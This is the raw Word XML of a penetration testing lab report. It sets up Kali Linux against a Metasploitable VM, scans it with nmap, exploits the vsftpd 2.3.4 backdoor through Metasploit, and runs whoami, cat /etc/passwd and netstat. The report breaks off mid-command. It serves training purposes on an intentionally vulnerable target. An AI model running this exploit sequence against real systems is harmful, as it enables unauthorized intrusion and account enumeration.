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26240" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Penetration Testing Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1FFF54" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7992F754" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The Penetration Testing Lab project aimed to establish a virtual environment for conducting controlled penetration tests using Kali Linux and Metasploitable. The primary focus was to identify, exploit, and analyze vulnerabilities within a simulated network environment. This hands-on experience provided practical skills in network security, vulnerability assessment, and exploitation, enhancing understanding of offensive and defensive cybersecurity techniques.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16274C1A" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Skills Learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9F3B36" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Penetration Testing Fundamentals: Practical understanding of penetration testing methods and tools.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Network Scanning and Enumeration: Ability to identify open ports and running services on target machines.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Exploitation and Vulnerability Analysis: Proficiency in discovering and exploiting system vulnerabilities.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Security Recommendations: Developing strategies to improve system security based on identified vulnerabilities.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Documentation and Reporting: Learning to document findings and communicate them clearly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03AF888C" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Tools Used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00161524" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Kali Linux: As the primary penetration testing operating system.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Metasploitable: A vulnerable virtual machine used as the target for exploitation.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Metasploit Framework: For exploiting vulnerabilities and conducting penetration tests.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Nmap: For network discovery and scanning open ports on the target.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Telnet: To remotely access the Metasploitable machine for further investigation.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Wireshark: For analyzing captured network traffic (optional, for deeper analysis).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A35B4FB" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Steps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296CF626" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Network Configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542BE5AC" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Set up the virtual network to allow communication between the Kali Linux (attacker) and Metasploitable (victim) virtual machines.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3316D778" w14:textId="1B1C8F14" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Adapter Settings:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Kali Linux: Set Adapter 1 to </w:t>
      </w:r>
      <w:r w:rsidR="00C574D1">
        <w:t>Bridged Adapter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and Adapter 2 to Internal Network.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  - Metasploitable: Set Adapter 1 to </w:t>
      </w:r>
      <w:r w:rsidR="00C574D1">
        <w:t>Bridged Adapter</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E54E439" w14:textId="1DAF9410" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1212464B" w14:textId="621F6D68" w:rsidR="00C574D1" w:rsidRDefault="00C574D1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AB51787" wp14:editId="405493B3">
            <wp:extent cx="3960000" cy="2216395"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="910379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1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1913" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Testing Network Connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2302DADA" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Verify network connectivity between Kali and Metasploitable by pinging the Metasploitable IP from Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9294B8" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ping &lt;Metasploitable IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7560212B" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Expected Result: Successful response from the Metasploitable IP, indicating connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5053DB" w14:textId="77777777" w:rsidR="00C574D1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r w:rsidR="00C574D1" w:rsidRPr="00C574D1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E57605" w14:textId="45B2B8A5" w:rsidR="00273A7E" w:rsidRDefault="00C574D1">
      <w:r w:rsidRPr="00C574D1">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7765D669" wp14:editId="18DF6D3D">
            <wp:extent cx="3960000" cy="2025690"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="840141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Ping Response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14ED59FD" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Initial Nmap Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A1ECEA" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Identify open ports and services running on the Metasploitable machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0ABB15" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  nmap -sS -A &lt;Metasploitable IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B7C1AA" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Expected Result: List of open ports and services, such as FTP, SSH, and Telnet, indicating potential entry points for exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D28A422" w14:textId="77777777" w:rsidR="00C574D1" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098D509B" w14:textId="385DAFA8" w:rsidR="00273A7E" w:rsidRDefault="00C574D1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00D19014" wp14:editId="37344A4E">
            <wp:extent cx="3810289" cy="1859280"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="128558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018" cy="18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>Nmap Results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5A067B" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Exploiting the vsftpd 2.3.4 Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B74AB0" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Use Metasploit to exploit a known vulnerability in the vsftpd service to gain access to the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB93001" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command Sequence:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  msfconsole</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  use exploit/unix/ftp/vsftpd_234_backdoor</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  set RHOST &lt;Metasploitable IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  exploit</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E73900B" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Expected Result: A successful session indicating that access was gained via the vsftpd vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5A944D" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3269F59A" w14:textId="17186EAD" w:rsidR="00273A7E" w:rsidRDefault="00F317C5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D968BCF" wp14:editId="035F1458">
            <wp:extent cx="4274103" cy="2085109"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2008782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703" cy="210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00000">
        <w:t>Metasploit Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FFD550" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>5. Checking Access Privileges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A712A9" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Verify access level on the Metasploitable system using `whoami`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E83CADD" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  whoami</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610A6895" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Expected Result: Display the username of the current session, confirming whether access was gained as `msfadmin` or `root`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB9110E" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675B1656" w14:textId="7092965C" w:rsidR="00273A7E" w:rsidRDefault="00F317C5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4330A8F2" wp14:editId="123117E5">
            <wp:extent cx="3948276" cy="2189018"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1304585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69"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3986490" cy="22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t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> Command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C74C4E6" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Listing User Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B2755D" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Identify user accounts configured on the system to determine possible points of privilege escalation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574D210A" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  cat /etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F95593" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Expected Result: List of user accounts on the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246D3F66" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C54B32F" w14:textId="0219E62B" w:rsidR="00273A7E" w:rsidRDefault="00F317C5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="317D2A3E" wp14:editId="3D9ABA0D">
            <wp:extent cx="4504962" cy="4364182"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1913974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21" cy="436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User Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486AD031" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Checking Running Services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C1B188" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Objective: Identify active services to look for additional potential vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C47E0E" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```bash</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  netstat -tuln</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E24BC25" w14:textId="77777777" w:rsidR="00273A7E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Expected Result: List of listening services and their respective ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288C8D69" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1252C836" w14:textId="5A79B9FD" w:rsidR="00273A7E" w:rsidRDefault="00F317C5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F3235EA" wp14:editId="089A89BD">
            <wp:extent cx="4253345" cy="2074983"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="1658016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50" cy="208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00000">
        <w:t>Running Services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B520833" w14:textId="6C3EE8CF" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Documenting Findings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35115163" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Network Configuration and Connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746C1A07" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Network Setup: The virtual machines were set up with Kali Linux as the attacker machine and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> as the target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722F814A" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Network Settings: Both machines were connected via an Internal Network to allow direct communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237FF2BD" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Connectivity Verification: The connection was verified by successfully pinging the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> machine from Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E900410" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Initial Nmap Scan Results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F8DDFC" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Objective: To enumerate open ports and services on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> machine to identify potential entry points.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6768F645" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Scan Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BC9A4B" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Findings:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Open Ports: Ports 21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), and 80 (HTTP) were found open.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- Service Information: The scan identified various services, including </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> on port 21, which indicated a potentially vulnerable version (2.3.4).</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">- Vulnerable Services: The presence of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2.3.4 was notable as it is known to have a backdoor vulnerability, making it a prime candidate for exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E78184C" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3. Exploitation of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0048E86A" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Exploit Used: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2.3.4 backdoor exploit in Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0808E4F5" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Command Sequence:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>use exploit/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/ftp/vsftpd_234_backdoor</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set RHOST &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58443231" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Outcome: After executing the exploit, a new session was opened, indicating successful access to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> machine through the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> backdoor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4669F1" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Privilege Level and User Verification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675B1F89" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Objective: Verify the access level achieved on the target system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD5B492" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Verification Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7A7D0ACB" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t xml:space="preserve">Result: The command confirmed access as root, providing full privileges on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A141212" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Enumeration of User Accounts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F060DFC" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Objective: Identify existing user accounts to assess privilege escalation opportunities and potential targets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06536766" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cat /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B26848" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Result: The file /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/passwd listed multiple users, including standard system accounts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F575CC8" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Running Services and Open Ports Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558F6190" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Objective: Check for any services currently active on the machine, which could be used to expand the scope of penetration testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789EA35B" w14:textId="77777777" w:rsidR="00F317C5" w:rsidRDefault="00F317C5" w:rsidP="00F317C5">
      <w:r>
        <w:t>Command:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>netstat -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tuln</w:t>
      </w:r>
